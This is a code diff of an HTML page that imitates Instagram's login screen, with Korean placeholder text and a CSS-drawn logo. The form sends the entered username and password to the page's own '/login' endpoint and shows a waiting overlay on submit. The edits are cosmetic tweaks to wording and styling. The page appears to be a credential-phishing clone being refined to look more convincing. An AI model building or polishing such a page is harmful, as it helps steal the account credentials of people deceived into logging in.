@@ -5,31 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        body { background-color: #000000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; height: 100vh; margin: 0; padding: 0; overflow: hidden; }
-        .main-container { width: 85%; max-width: 350px; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; box-sizing: border-box; }
+        body { background-color: #000000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; height: 100vh; margin: 0; padding: 0; }
+        .main-container { width: 85%; max-width: 350px; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; }
         .insta-logo-wrapper { width: 75px; height: 75px; background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); border-radius: 18px; display: flex; align-items: center; justify-content: center; margin-bottom: 40px; }
         .insta-logo-inner { width: 45px; height: 45px; border: 4px solid white; border-radius: 12px; position: relative; }
         .insta-logo-inner::after { content: ''; position: absolute; width: 22px; height: 22px; border: 4px solid white; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); }
         input { width: 100%; padding: 14px; background-color: #121212; border: 1px solid #363636; border-radius: 12px; color: white; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; }
-        .login-btn { width: 100%; padding: 12px; background-color: #0064e0; border: none; border-radius: 25px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .login-btn { width: 100%; padding: 12px; background-color: #0064e0; border: none; border-radius: 25px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; }
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #0095f6; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="loading-overlay"><div class="spinner"></div><p style="margin-top: 15px; font-size: 14px; color: #a8a8a8;">보안 확인 중...</p></div>
+    <div id="loading-overlay"><div class="spinner"></div><p style="margin-top: 15px; color: #a8a8a8;">잠시만 기다려 주세요...</p></div>
     <div class="main-container">
         <div class="insta-logo-wrapper"><div class="insta-logo-inner"></div></div>
         <form id="loginForm" action="/login" method="POST" style="width: 100%;">
-            <input type="text" name="username" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
+            <input type="text" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
             <input type="password" name="password" placeholder="비밀번호" required>
             <button type="submit" class="login-btn" id="loginBtn">로그인</button>
         </form>
     </div>
     <script>
         document.getElementById('loginForm').onsubmit = function() {
-            document.getElementById('loginBtn').disabled = true;
             document.getElementById('loading-overlay').style.display = 'flex';
             return true;
         };
